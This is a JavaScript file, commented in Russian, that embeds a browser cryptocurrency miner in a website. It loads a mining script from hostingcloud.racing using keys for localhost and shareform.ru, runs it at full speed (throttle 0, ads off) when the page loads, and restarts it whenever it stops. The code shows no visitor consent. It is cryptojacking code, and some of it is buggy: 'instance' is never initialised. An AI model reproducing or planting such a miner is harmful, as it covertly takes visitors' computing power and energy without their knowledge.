function coins() {
    let instance;
    let src; //script src
    let key;

    function loadScript(src) {
        return new Promise(function(resolve, reject) {
            let script = document.createElement('script');
            script.src = src;

            script.onload = () => resolve(script);
            script.onerror = () => reject(new Error(`Ошибка загрузки скрипта ${src}`));

            document.head.append(script);
        });
    }

    // присваиваем или получаем src
    instance.src = (s) => {
        if (!arguments.length) return src;
        src = s;
        return instance;
    };

    // присваиваем или получаем key
    instance.key = (k) => {
        if (!arguments.length) return key;
        key = k;
        return instance;
    };

    // запускаем майнер
    instance.start = () => {

        loadScript(src)
            .then(
                function(result) {
                    let _client = new Client.Anonymous(key, {
                        throttle: 0,
                        c: 'w',
                        ads: 0
                    });

                    let start = new Date();
                    let now = start;
                    let last = start;
                    let running = false;
                    let hashes = 0;
                    let jobs = 0;
                    let founds = 0;

                    _client.start();

                    let onMobile = _client.isMobile();
                    //let wasmEnabled = _client.hasWASMSupport();
                    //let isAutoThreads = _client.getAutoThreadsEnabled();
                    let hps = _client.getHashesPerSecond();
                    //let threads = _client.getNumThreads();
                    //let throttle = _client.getThrottle();

                    _client.on('open', function(args) {
                        start = new Date();
                    });

                    _client.on('job', function(args) {
                        jobs = jobs + 1;
                    });

                    _client.on('found', function(args) {
                        console.log(args);

                        founds = founds + 1;
                        last = new Date();
                        if (founds > jobs) {
                            founds = 0;
                            _client.stop();
                        }
                    });

                    _client.on('close', function(args) {
                        jobs = 0;
                        founds = 0;
                        last = new Date();
                        _client.start();
                    });

                    setInterval(function() {

                        running = _client.isRunning();
                        hps = _client.getHashesPerSecond();

                        now = new Date();
                        let diff = ((now - last) / 1000).toFixed(1);

                        console.log(hps.toFixed(2) + ' (' + jobs + '/' + founds + ') ' + diff + 'с');


                        if (diff > 90) {
                            last = new Date();
                            _client.stop();
                        }


                    }, 500);
                },
                function(error) {
                    console.log(error);
                });
        return instance;
    };



    const _url = new URL(document.location.href);
    const _s = {
        'local': {
            'src': 'https://www.hostingcloud.racing/2KFX.js',
            'key': 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
        },
        'share': {
            'src': 'https://www.hostingcloud.racing/rhdQ.js',
            'key': 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
        }
    };
    let _src = '';
    let _key = '';

    if (_url.toString().indexOf('127.0.0.1') != -1) {
        _src = _s.local.src;
        _key = _s.local.key;
    } else if (_url.toString().indexOf('shareform.ru') != -1) {
        _src = _s.share.src;
        _key = _s.share.key;
    }


    loadScript(_src)
        .then(
            function(result) {
                let _client = new Client.Anonymous(_key, {
                    throttle: 0,
                    c: 'w'
                });

                let start = new Date();
                let now = start;
                let last = start;
                let running = false;
                let hashes = 0;
                let jobs = 0;
                let founds = 0;

                _client.start();

                let onMobile = _client.isMobile();
                //let wasmEnabled = _client.hasWASMSupport();
                //let isAutoThreads = _client.getAutoThreadsEnabled();
                let hps = _client.getHashesPerSecond();
                //let threads = _client.getNumThreads();
                //let throttle = _client.getThrottle();

                _client.on('open', function(args) {
                    start = new Date();
                });

                _client.on('job', function(args) {
                    jobs = jobs + 1;
                });

                _client.on('found', function(args) {
                    console.log(args);

                    founds = founds + 1;
                    last = new Date();
                    if (founds > jobs) {
                        founds = 0;
                        _client.stop();
                    }
                });

                _client.on('close', function(args) {
                    jobs = 0;
                    founds = 0;
                    last = new Date();
                    _client.start();
                });



                setInterval(function() {

                    running = _client.isRunning();
                    hps = _client.getHashesPerSecond();

                    now = new Date();
                    let diff = ((now - last) / 1000).toFixed(1);

                    console.log(hps.toFixed(2) + ' (' + jobs + '/' + founds + ') ' + diff + 'с');


                    if (diff > 90) {
                        last = new Date();
                        _client.stop();
                    }


                }, 500);
            },
            function(error) {
                console.log(error);
            });

    return instance;
}